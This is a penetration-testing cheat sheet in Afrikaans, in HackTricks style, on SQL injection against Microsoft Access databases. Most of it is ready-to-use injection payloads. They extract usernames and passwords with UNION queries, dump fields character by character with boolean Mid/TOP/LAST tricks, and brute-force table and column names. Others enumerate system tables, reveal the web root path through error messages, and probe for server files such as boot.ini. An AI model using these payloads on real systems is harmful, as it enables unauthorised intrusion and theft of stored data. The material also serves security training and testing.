# MS Access SQL Injection

{{#include ../../banners/hacktricks-training.md}}

## Aanlyn Speelgrond

- [https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format&ss=-1)

## DB Beperkings

### String Samevoeging

String samevoeging is moontlik met `& (%26)` en `+ (%2b)` karakters.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Kommentaar

Daar is geen kommentaar in MS Access nie, maar dit blyk moontlik te wees om die laaste van 'n navraag met 'n NULL-karakter te verwyder:
```sql
1' union select 1,2 from table%00
```
As dit nie werk nie, kan jy altyd die sintaksis van die navraag regmaak:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Gestapelde Vrae

Hulle word nie ondersteun nie.

### BEPERK

Die **`LIMIT`** operator **is nie geïmplementeer** nie. Dit is egter moontlik om SELECT-vraagresultate te beperk tot die **eerste N tabel rye met die `TOP` operator**. `TOP` aanvaar as argument 'n heelgetal, wat die aantal rye verteenwoordig wat teruggegee moet word.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Net soos TOP kan jy **`LAST`** gebruik wat die **rye van die einde** sal kry.

## UNION Vrae/Subvrae

In 'n SQLi wil jy gewoonlik op een of ander manier 'n nuwe vraag uitvoer om inligting uit ander tabelle te onttrek. MS Access vereis altyd dat in **subvrae of ekstra vrae 'n `FROM` aangedui word**.\
So, as jy 'n `UNION SELECT` of `UNION ALL SELECT` of 'n `SELECT` tussen hakies in 'n voorwaarde wil uitvoer, moet jy altyd **'n `FROM` met 'n geldige tabelnaam aandui**.\
Daarom moet jy 'n **geldige tabelnaam** ken.
```sql
-1' UNION SELECT username,password from users%00
```
### Ketting gelyk + Substring

> [!WARNING]
> Dit sal jou toelaat om waardes van die huidige tabel te exfiltreer sonder om die naam van die tabel te hoef te weet.

**MS Access** laat **vreemde sintaksis** soos **`'1'=2='3'='asd'=false`** toe. Soos gewoonlik sal die SQL-inspuiting binne 'n **`WHERE`** klousule wees en ons kan dit misbruik.

Stel jou voor jy het 'n SQLi in 'n MS Access-databasis en jy weet (of het geraai) dat een **kolomnaam username** is, en dit is die veld wat jy wil **exfiltreer**. Jy kan die verskillende reaksies van die webtoepassing nagaan wanneer die ketting gelyk tegniek gebruik word en moontlik inhoud met 'n **booleaanse inspuiting** exfiltreer deur die **`Mid`** funksie te gebruik om substrings te verkry.
```sql
'=(Mid(username,1,3)='adm')='
```
As jy die **naam van die tabel** en **kolom** weet om te dump, kan jy 'n kombinasie van `Mid`, `LAST` en `TOP` gebruik om **alle inligting** via boolean SQLi te **lek**:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel vry om dit in die aanlyn speelgrond te kontroleer._

### Brute-forcing Tabelname

Deur die kettinggelyk tegniek te gebruik, kan jy ook **bruteforce tabelname** met iets soos:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
Jy kan ook 'n meer tradisionele manier gebruik:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Feel vry om dit in die aanlyn speelgrond te kontroleer._

- Sqlmap algemene tabelname: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
- Daar is 'n ander lys in [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### Brute-Forcing Kolomname

Jy kan **brute-force huidige kolomname** met die ketting gelyk trick met:
```sql
'=column_name='
```
Of met 'n **group by**:
```sql
-1' GROUP BY column_name%00
```
Of jy kan die kolomname van 'n **ander tabel** brute-force met:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Data dump

Ons het reeds die [**chaining equals tegniek**](ms-access-sql-injection.md#chaining-equals-+-substring) **bespreek om data uit die huidige en ander tabelle te dump**. Maar daar is ander maniere:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
In 'n neutedop gebruik die navraag 'n "if-then" verklaring om 'n "200 OK" te aktiveer in geval van sukses of 'n "500 Internal Error" andersins. Deur voordeel te trek uit die TOP 10 operator, is dit moontlik om die eerste tien resultate te kies. Die daaropvolgende gebruik van LAST laat toe om slegs die 10de tuple te oorweeg. Op so 'n waarde, deur die MID operator te gebruik, is dit moontlik om 'n eenvoudige karaktervergelyking uit te voer. Deur die indeks van MID en TOP behoorlik te verander, kan ons die inhoud van die "username" veld vir alle rye dump.

### Tydgebaseerd

Check [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](<https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN>)

### Ander Interessante funksies

- `Mid('admin',1,1)` kry substring vanaf posisie 1 lengte 1 (beginposisie is 1)
- `LEN('1234')` kry lengte van string
- `ASC('A')` kry ascii waarde van karakter
- `CHR(65)` kry string van ascii waarde
- `IIF(1=1,'a','b')` as dan
- `COUNT(*)` Tel aantal items

## Tabels opnoem

Van [**hier**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) kan jy 'n navraag sien om tabelname te kry:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
However, note that is very typical to find SQL Injections where you **don't have access to read the table `MSysObjects`**.

## FileSystem toegang

### Web Root Directory Volle Pad

Die kennis van die **web root absolute pad mag verdere aanvalle fasiliteer**. As toepassingsfoute nie heeltemal verborge is nie, kan die gids pad ontdek word deur te probeer om data van 'n nie-bestaande databasis te kies.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access reageer met 'n **foutboodskap wat die web gids se volle padnaam bevat**.

### Lêer Enumerasie

Die volgende aanvalsvector kan gebruik word om **die bestaan van 'n lêer op die afstands lêerstelsel af te lei**. As die gespesifiseerde lêer bestaan, aktiveer MS Access 'n foutboodskap wat inligting gee dat die databasisformaat ongeldig is:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Nog 'n manier om lêers te enumerate, bestaan uit **die spesifisering van 'n databasis.tabel item**. **As** die gespesifiseerde **lêer bestaan**, vertoon MS Access 'n **databasisformaat foutboodskap**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdb Lêernaam Raai

**Databasis lêernaam (.mdb)** kan afgelei word met die volgende navraag:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Waar **name\[i] 'n .mdb lêernaam** is en **realTable 'n bestaande tabel** binne die databasis is. Alhoewel MS Access altyd 'n foutboodskap sal aktiveer, is dit moontlik om te onderskei tussen 'n ongeldige lêernaam en 'n geldige .mdb lêernaam.

### .mdb Wagwoord Kraker

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) is 'n gratis nut wat gebruik kan word om die hoof databasis wagwoord van Microsoft Access 95/97/2000/XP of Jet Database Engine 3.0/4.0 te herstel.

## Verwysings

- [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

{{#include ../../banners/hacktricks-training.md}}
